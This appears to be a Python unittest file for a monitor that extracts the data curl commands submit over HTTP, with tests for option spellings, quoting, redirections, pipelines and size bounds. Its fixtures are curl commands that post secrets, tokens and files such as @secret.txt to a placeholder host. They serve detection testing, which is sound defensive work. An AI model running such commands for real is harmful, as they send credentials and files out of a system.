from __future__ import annotations

import unittest

from hook_monitor.analysis.bash_submission import (
    BashSubmissionProjection,
    extract_bash_http_submissions,
)


_URL = "https://example.invalid"
_MAX_VALUES = 32
_MAX_VALUE_BYTES = 32 * 1024
_MAX_TOTAL_BYTES = 128 * 1024


class BashSubmissionExtractionTests(unittest.TestCase):
    def _signatures(
        self,
        command: str,
    ) -> list[tuple[int, str, tuple[str, ...]]]:
        projections = extract_bash_http_submissions(command)
        self.assertTrue(
            all(isinstance(item, BashSubmissionProjection) for item in projections)
        )
        return [
            (item.segment_index, item.extraction, item.submitted_values)
            for item in projections
        ]

    def assert_static(
        self,
        command: str,
        *values: str,
        segment_index: int = 0,
    ) -> None:
        self.assertEqual(
            [(segment_index, "static_values", tuple(values))],
            self._signatures(command),
        )

    def assert_coarse(self, command: str, *, segment_index: int = 0) -> None:
        self.assertEqual(
            [(segment_index, "coarse_fallback", ())],
            self._signatures(command),
        )

    def test_data_option_spellings_extract_full_decoded_operands(self) -> None:
        cases = {
            f"curl -d SECRET {_URL}": "SECRET",
            f"curl -dSECRET {_URL}": "SECRET",
            f"curl -d=SECRET {_URL}": "=SECRET",
            f"curl --data SECRET {_URL}": "SECRET",
            f"curl --data=SECRET {_URL}": "SECRET",
            f"curl --data-ascii SECRET {_URL}": "SECRET",
            f"curl --data-ascii=SECRET {_URL}": "SECRET",
            f"curl --data-binary SECRET {_URL}": "SECRET",
            f"curl --data-binary=SECRET {_URL}": "SECRET",
            f"curl --data-raw SECRET {_URL}": "SECRET",
            f"curl --data-raw=SECRET {_URL}": "SECRET",
            f"curl --json SECRET {_URL}": "SECRET",
            f"curl --json=SECRET {_URL}": "SECRET",
            f"curl --form-string name=SECRET {_URL}": "name=SECRET",
            f"curl --form-string=name=SECRET {_URL}": "name=SECRET",
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                self.assert_static(command, expected)

    def test_data_urlencode_distinguishes_literal_and_file_forms(self) -> None:
        static_cases = {
            f"curl --data-urlencode SECRET {_URL}": "SECRET",
            f"curl --data-urlencode =SECRET {_URL}": "=SECRET",
            f"curl --data-urlencode name=SECRET {_URL}": "name=SECRET",
            f"curl --data-urlencode=name=SECRET {_URL}": "name=SECRET",
            f"curl --data-urlencode name=foo@bar {_URL}": "name=foo@bar",
        }
        for command, expected in static_cases.items():
            with self.subTest(command=command):
                self.assert_static(command, expected)

        for command in (
            f"curl --data-urlencode @secret.txt {_URL}",
            f"curl --data-urlencode @- {_URL}",
            f"curl --data-urlencode name@secret.txt {_URL}",
            f"curl --data-urlencode name@- {_URL}",
        ):
            with self.subTest(command=command):
                self.assert_coarse(command)

    def test_at_file_is_not_literal_except_for_raw_and_form_string(self) -> None:
        for option in (
            "-d",
            "--data",
            "--data-ascii",
            "--data-binary",
            "--json",
        ):
            for operand in ("@secret.txt", "@-"):
                command = f"curl {option} {operand} {_URL}"
                with self.subTest(command=command):
                    self.assert_coarse(command)

        self.assert_static(f"curl --data-raw @SECRET {_URL}", "@SECRET")
        self.assert_static(
            f"curl --form-string name=@SECRET {_URL}",
            "name=@SECRET",
        )

    def test_quote_provenance_and_shell_escaping_are_preserved(self) -> None:
        static_cases = {
            f"curl -d '$TOKEN' {_URL}": "$TOKEN",
            rf"curl -d \$TOKEN {_URL}": "$TOKEN",
            rf'curl -d "\$TOKEN" {_URL}': "$TOKEN",
            f"curl -d '$(helper)' {_URL}": "$(helper)",
            f"curl -d '`helper`' {_URL}": "`helper`",
            f"curl -d '*' {_URL}": "*",
            f"curl -d '~service' {_URL}": "~service",
            f"curl -d 'a{{b,c}}' {_URL}": "a{b,c}",
            f"curl -d 'sec'\"ret\" {_URL}": "secret",
            rf'curl -d "a\q" {_URL}': r"a\q",
        }
        for command, expected in static_cases.items():
            with self.subTest(command=command):
                self.assert_static(command, expected)

        for command in (
            f'curl -d "$TOKEN" {_URL}',
            f"curl -d $TOKEN {_URL}",
            f'curl -d "$(helper)" {_URL}',
            f'curl -d "`helper`" {_URL}',
            f"curl -d * {_URL}",
            f"curl -d ~service {_URL}",
            f"curl -d a{{b,c}} {_URL}",
            f"curl -d $'SECRET' {_URL}",
            f'curl -d $"SECRET" {_URL}',
        ):
            with self.subTest(command=command):
                self.assert_coarse(command)

    def test_option_terminator_is_stateful_and_operand_consumption_wins(self) -> None:
        self.assert_coarse(f"curl -- -d SECRET {_URL}")
        self.assert_static(f"curl -d -- {_URL}", "--")
        self.assert_static(f"curl --data -- {_URL}", "--")
        # An explicitly empty operand is consumed in-place, but contains no
        # value worth projecting as protected content.
        self.assert_coarse(f"curl --data= -- {_URL}")
        self.assert_static(f"curl -d -x {_URL}", "-x")
        self.assert_static(
            f"curl -d SECRET -- -d PUBLIC {_URL}",
            "SECRET",
        )

    def test_unknown_option_arity_never_reclassifies_its_operand_as_data(self) -> None:
        # curl parses -d as --output's operand here. A payload-only grep would
        # incorrectly promote SECRET to a static HTTP body.
        self.assert_coarse(f"curl --output -d SECRET {_URL}")
        self.assert_coarse(f"curl -o-d SECRET {_URL}")
        self.assert_coarse(f"curl --future-option -d SECRET {_URL}")

        # The first implementation deliberately does not parse short clusters.
        self.assert_coarse(f"curl -sdSECRET {_URL}")
        self.assert_coarse(f"curl -LdSECRET {_URL}")

        # The request option is a required control-option exception because it
        # occurs in the production evaluation corpus.
        self.assert_static(
            f"curl -X POST {_URL} -d SECRET",
            "SECRET",
        )
        self.assert_static(
            f"curl --request POST {_URL} --data=SECRET",
            "SECRET",
        )

    def test_dynamic_non_payload_words_cannot_change_option_arity(self) -> None:
        for command in (
            f"curl $OPTS -d SECRET {_URL}",
            f"curl -X $EMPTY -d SECRET {_URL}",
            f'curl -X "$METHOD" -d SECRET {_URL}',
            f"curl -d SECRET $LATER_OPTIONS {_URL}",
            f"curl -d SECRET > $OUTPUT {_URL}",
        ):
            with self.subTest(command=command):
                self.assert_coarse(command)

        self.assert_static(
            'curl -d SECRET -- "$DYNAMIC_URL"',
            "SECRET",
        )

    def test_unsupported_curl_payload_surfaces_remain_coarse(self) -> None:
        for command in (
            f"curl -F name=SECRET {_URL}",
            f"curl --form name=SECRET {_URL}",
            f"curl --url {_URL}?token=SECRET",
            f"curl {_URL}?token=SECRET",
            f"curl --url-query name=SECRET {_URL}",
            f"curl -H Authorization:SECRET {_URL}",
            f"curl --expand-data '{{{{token}}}}' {_URL}",
        ):
            with self.subTest(command=command):
                self.assert_coarse(command)

    def test_multiple_operands_preserve_order_without_synthesizing_body(self) -> None:
        self.assert_static(
            f"curl -d first --data=second --data-raw third {_URL}",
            "first",
            "second",
            "third",
        )
        self.assert_static(
            f"curl --json '{{' --json '}}' {_URL}",
            "{",
            "}",
        )

    def test_static_redirections_are_removed_before_curl_option_parsing(self) -> None:
        self.assert_static(f"curl -d SECRET > response.txt {_URL}", "SECRET")
        self.assert_static(f"curl > response.txt -d SECRET {_URL}", "SECRET")
        self.assert_static(
            f"curl 2> errors.txt -X POST -d SECRET {_URL}",
            "SECRET",
        )

    def test_malformed_or_empty_redirection_never_proves_submission(self) -> None:
        for command in (
            "curl -d SECRET >",
            "curl -d SECRET > && true",
            "curl -d SECRET < > response.txt",
        ):
            with self.subTest(command=command):
                self.assertEqual([], self._signatures(command))

        self.assert_coarse("curl -d SECRET > '' https://example.invalid")

    def test_segments_and_pipelines_are_isolated(self) -> None:
        self.assertEqual(
            [
                (0, "static_values", ("FIRST",)),
                (1, "static_values", ("SECOND",)),
            ],
            self._signatures(
                f"curl -d FIRST {_URL} ; curl -d SECOND {_URL}"
            ),
        )
        self.assertEqual(
            [(1, "static_values", ("PUBLIC",))],
            self._signatures(f"printf SECRET ; curl -d PUBLIC {_URL}"),
        )
        self.assertEqual(
            [(1, "coarse_fallback", ())],
            self._signatures(
                f"printf SECRET | curl --data-binary @- {_URL}"
            ),
        )
        self.assertEqual(
            [
                (0, "static_values", ("FIRST",)),
                (1, "static_values", ("SECOND",)),
            ],
            self._signatures(
                f"curl -d FIRST {_URL} && curl -d SECOND {_URL}"
            ),
        )

    def test_direct_curl_program_resolution_is_static_and_bounded(self) -> None:
        self.assert_static(f"TOKEN=public curl -d SECRET {_URL}", "SECRET")
        self.assert_static(f"TOKEN='public value' curl -d SECRET {_URL}", "SECRET")
        self.assert_static(f"TOKEN+=public curl -d SECRET {_URL}", "SECRET")
        self.assert_static(f"/usr/bin/curl -d SECRET {_URL}", "SECRET")
        self.assert_static(f"'curl' -d SECRET {_URL}", "SECRET")
        self.assert_static(rf"c\url -d SECRET {_URL}", "SECRET")

        self.assertEqual([], self._signatures(f"builtin curl -d SECRET {_URL}"))
        self.assertEqual([], self._signatures(f"wget --post-data SECRET {_URL}"))
        self.assertEqual([], self._signatures("printf SECRET"))

    def test_quoted_or_escaped_assignment_like_command_is_not_skipped(self) -> None:
        for prefix in (
            "'TOKEN=public'",
            '"TOKEN=public"',
            "'TOKEN'=public",
            r"T\OKEN=public",
            r"TOKEN\=public",
            "変数=public",
        ):
            command = f"{prefix} curl -d SECRET {_URL}"
            with self.subTest(command=command):
                self.assertEqual([], self._signatures(command))

    def test_value_count_bound_is_inclusive_then_falls_back(self) -> None:
        accepted = tuple(f"value-{index}" for index in range(_MAX_VALUES))
        accepted_command = "curl " + " ".join(
            f"-d {value}" for value in accepted
        ) + f" {_URL}"
        self.assert_static(accepted_command, *accepted)

        rejected = accepted + ("one-too-many",)
        rejected_command = "curl " + " ".join(
            f"-d {value}" for value in rejected
        ) + f" {_URL}"
        self.assert_coarse(rejected_command)

    def test_value_byte_bound_counts_utf8_bytes(self) -> None:
        accepted = "x" * _MAX_VALUE_BYTES
        self.assert_static(f"curl -d {accepted} {_URL}", accepted)
        self.assert_coarse(f"curl -d {accepted}x {_URL}")

        unicode_accepted = "あ" * (_MAX_VALUE_BYTES // 3)
        self.assert_static(
            f"curl -d {unicode_accepted} {_URL}",
            unicode_accepted,
        )
        self.assert_coarse(f"curl -d {unicode_accepted}あ {_URL}")

    def test_total_value_byte_bound_is_inclusive_then_falls_back(self) -> None:
        value = "x" * _MAX_VALUE_BYTES
        accepted = (value,) * (_MAX_TOTAL_BYTES // _MAX_VALUE_BYTES)
        accepted_command = "curl " + " ".join(
            f"-d {item}" for item in accepted
        ) + f" {_URL}"
        self.assert_static(accepted_command, *accepted)

        rejected = accepted + ("x",)
        rejected_command = "curl " + " ".join(
            f"-d {item}" for item in rejected
        ) + f" {_URL}"
        self.assert_coarse(rejected_command)


if __name__ == "__main__":
    unittest.main()
